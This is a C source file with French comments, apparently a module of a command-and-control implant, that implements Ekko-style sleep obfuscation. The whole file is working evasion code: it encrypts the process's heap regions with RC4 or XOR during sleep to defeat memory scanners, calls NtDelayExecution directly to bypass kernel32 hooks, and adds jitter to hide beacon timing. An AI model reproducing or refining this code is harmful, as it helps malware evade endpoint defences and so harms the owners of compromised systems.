/*
 * sleep.c - Implémentation du sleep obfuscation
 *
 * Technique inspirée de "Ekko" - chiffre la mémoire heap pendant le sleep
 * pour éviter les détections par scan mémoire.
 */

#include "sleep.h"
#include "../crypto/aes.h"
#include "../utils/memory.h"
#include "syscalls.h"

/* Définitions pour SystemFunction032 (RC4) */
typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (NTAPI *pSystemFunction032)(USTRING* Data, USTRING* Key);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef VOID (NTAPI *pRtlCaptureContext)(PCONTEXT);
typedef NTSTATUS (NTAPI *pNtContinue)(PCONTEXT, BOOLEAN);

/* État du module */
static bool g_sleep_initialized = false;
static bool g_heap_encryption_enabled = true;

/* Clé temporaire pour le chiffrement pendant le sleep */
static uint8_t g_sleep_key[32];
static uint8_t g_sleep_iv[16];

/* Régions mémoire à chiffrer */
typedef struct {
    PVOID base;
    SIZE_T size;
    DWORD originalProtect;
} MemoryRegion;

#define MAX_REGIONS 64
static MemoryRegion g_regions[MAX_REGIONS];
static int g_regionCount = 0;

/* Fonctions internes */

/*
 * Génère une clé aléatoire pour ce sleep.
 */
static void generate_sleep_key(void) {
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);

    /* PRNG basé sur timestamp + thread ID */
    srand((unsigned int)(counter.LowPart ^ GetCurrentThreadId() ^ GetTickCount()));

    for (int i = 0; i < 32; i++) {
        g_sleep_key[i] = (uint8_t)(rand() & 0xFF);
    }

    for (int i = 0; i < 16; i++) {
        g_sleep_iv[i] = (uint8_t)(rand() & 0xFF);
    }
}

/*
 * Récupère les boundaries de l'image en mémoire.
 */
static bool get_image_boundaries(void **base, size_t *size) {
    HMODULE hmodule = GetModuleHandleA(NULL);
    if (!hmodule) {
        return false;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hmodule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((uint8_t *)hmodule + dos->e_lfanew);

    *base = hmodule;
    *size = nt->OptionalHeader.SizeOfImage;

    return true;
}

/*
 * Énumère les régions heap du processus courant
 */
static void enumerate_heap_regions(void) {
    g_regionCount = 0;
    
    void* imageBase = NULL;
    size_t imageSize = 0;
    get_image_boundaries(&imageBase, &imageSize);
    
    MEMORY_BASIC_INFORMATION mbi;
    PBYTE addr = NULL;
    
    while (VirtualQuery(addr, &mbi, sizeof(mbi)) && g_regionCount < MAX_REGIONS) {
        // Cherche les régions privées RW (typiquement heap/stack)
        if (mbi.State == MEM_COMMIT && 
            mbi.Type == MEM_PRIVATE &&
            (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_EXECUTE_READWRITE)) {
            
            // Ignore notre propre image
            if (mbi.BaseAddress >= imageBase && 
                mbi.BaseAddress < (PBYTE)imageBase + imageSize) {
                addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
                continue;
            }
            
            // Ignore les régions trop petites ou trop grandes
            if (mbi.RegionSize >= 4096 && mbi.RegionSize <= 16 * 1024 * 1024) {
                g_regions[g_regionCount].base = mbi.BaseAddress;
                g_regions[g_regionCount].size = mbi.RegionSize;
                g_regions[g_regionCount].originalProtect = mbi.Protect;
                g_regionCount++;
            }
        }
        
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
}

/*
 * Chiffre/Déchiffre une région mémoire avec XOR (simple mais efficace)
 */
static void xor_memory_region(PVOID base, SIZE_T size) {
    PBYTE ptr = (PBYTE)base;
    
    for (SIZE_T i = 0; i < size; i++) {
        ptr[i] ^= g_sleep_key[i % 32] ^ g_sleep_iv[i % 16];
    }
}

/*
 * Chiffre les régions heap avec SystemFunction032 (RC4)
 */
static bool encrypt_regions_rc4(void) {
    HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
    if (!hAdvapi) {
        hAdvapi = LoadLibraryA("advapi32.dll");
    }
    if (!hAdvapi) return false;
    
    pSystemFunction032 SystemFunction032 = 
        (pSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
    
    if (!SystemFunction032) return false;
    
    USTRING key;
    key.Buffer = g_sleep_key;
    key.Length = 16;
    key.MaximumLength = 16;
    
    for (int i = 0; i < g_regionCount; i++) {
        USTRING data;
        data.Buffer = g_regions[i].base;
        data.Length = (DWORD)g_regions[i].size;
        data.MaximumLength = (DWORD)g_regions[i].size;
        
        // Change les permissions en RW si nécessaire
        DWORD oldProtect;
        if (!VirtualProtect(g_regions[i].base, g_regions[i].size, 
                           PAGE_READWRITE, &oldProtect)) {
            continue;
        }
        
        // Chiffre avec RC4
        SystemFunction032(&data, &key);
        
        // Restaure les permissions
        VirtualProtect(g_regions[i].base, g_regions[i].size, oldProtect, &oldProtect);
    }
    
    return true;
}

/*
 * Déchiffre les régions heap (RC4 est symétrique)
 */
static bool decrypt_regions_rc4(void) {
    return encrypt_regions_rc4(); // RC4 est symétrique
}

/*
 * Chiffre les régions avec XOR simple (fallback)
 */
static void encrypt_regions_xor(void) {
    for (int i = 0; i < g_regionCount; i++) {
        DWORD oldProtect;
        if (VirtualProtect(g_regions[i].base, g_regions[i].size, 
                          PAGE_READWRITE, &oldProtect)) {
            xor_memory_region(g_regions[i].base, g_regions[i].size);
            VirtualProtect(g_regions[i].base, g_regions[i].size, oldProtect, &oldProtect);
        }
    }
}

/*
 * Déchiffre les régions avec XOR (symétrique)
 */
static void decrypt_regions_xor(void) {
    encrypt_regions_xor(); // XOR est symétrique
}

/* API publique */

int sleep_init(void) {
    if (g_sleep_initialized) {
        return STATUS_SUCCESS;
    }

    /* Génère une clé initiale */
    generate_sleep_key();

    g_sleep_initialized = true;
    return STATUS_SUCCESS;
}

void basic_sleep(DWORD ms) {
    /*
     * Sleep via NtDelayExecution au lieu de Sleep()
     * pour éviter les hooks sur kernel32
     */
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG)ms * 10000); /* En 100ns, négatif = relatif */

    sys_NtDelayExecution(FALSE, &delay);
}

void obfuscated_sleep(DWORD ms) {
    if (!g_sleep_initialized) {
        sleep_init();
    }

    if (!g_heap_encryption_enabled || ms < 1000) {
        // Pour les courts sleeps, pas besoin de chiffrer
        basic_sleep(ms);
        return;
    }

    /* Génère une nouvelle clé pour ce sleep */
    generate_sleep_key();
    
    /* Énumère les régions heap */
    enumerate_heap_regions();
    
    if (g_regionCount == 0) {
        basic_sleep(ms);
        return;
    }
    
    /* Chiffre les régions */
    bool useRC4 = encrypt_regions_rc4();
    if (!useRC4) {
        encrypt_regions_xor();
    }
    
    /* Dort */
    basic_sleep(ms);
    
    /* Déchiffre les régions */
    if (useRC4) {
        decrypt_regions_rc4();
    } else {
        decrypt_regions_xor();
    }
}

void sleep_with_jitter(DWORD baseMs, DWORD jitterPercent) {
    /*
     * Ajoute un jitter aléatoire au sleep pour éviter
     * les patterns de timing détectables
     */
    if (jitterPercent > 100) jitterPercent = 100;
    
    DWORD jitterRange = (baseMs * jitterPercent) / 100;
    DWORD actualJitter = 0;
    
    if (jitterRange > 0) {
        actualJitter = (DWORD)(rand() % jitterRange);
        // 50% de chance d'ajouter ou soustraire
        if (rand() % 2 == 0) {
            actualJitter = baseMs + actualJitter;
        } else {
            actualJitter = baseMs > actualJitter ? baseMs - actualJitter : baseMs;
        }
    } else {
        actualJitter = baseMs;
    }
    
    obfuscated_sleep(actualJitter);
}

void sleep_set_heap_encryption(bool enabled) {
    g_heap_encryption_enabled = enabled;
}

bool sleep_is_heap_encryption_enabled(void) {
    return g_heap_encryption_enabled;
}

void sleep_cleanup(void) {
    secure_zero(g_sleep_key, sizeof(g_sleep_key));
    secure_zero(g_sleep_iv, sizeof(g_sleep_iv));
    g_regionCount = 0;
    g_sleep_initialized = false;
}
